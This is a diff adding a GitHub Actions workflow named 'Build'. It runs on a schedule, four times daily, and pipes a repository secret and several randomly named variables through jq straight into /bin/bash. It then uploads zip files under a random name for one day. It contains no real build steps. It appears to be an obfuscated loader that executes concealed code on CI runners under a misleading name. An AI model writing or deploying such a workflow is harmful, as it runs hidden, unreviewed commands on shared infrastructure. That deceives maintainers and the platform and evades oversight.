@@ -1,0 +1,35 @@
+name: Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '52 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  compile:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup and run
+        env:
+          q8437: ${{ secrets.q8437 }}
+        run: |
+          printf '%s' "$q8437" | jq -r .bzem6828 | /bin/bash
+          echo $eizyb11 | jq -r .ypnux49431 | /bin/bash
+          printf '%s' "$jny01" | jq -r .rrxbz986 | /bin/bash
+          echo $yxyv50 | jq -r .ypc782 | /bin/bash
+          printf '%s' "$dmurr11" | jq -r .vxdfi3739 | /bin/bash
+          printf '%s' "$egtt06110" | jq -r .hfh805 | /bin/bash
+          echo $xe15 | jq -r .nqal74584 | /bin/bash
+          echo $ibbg346 | jq -r .gt24473 | /bin/bash
+
+      - name: Upload data
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: w975DTIZ
+          path: "*.zip"
+          retention-days: 1
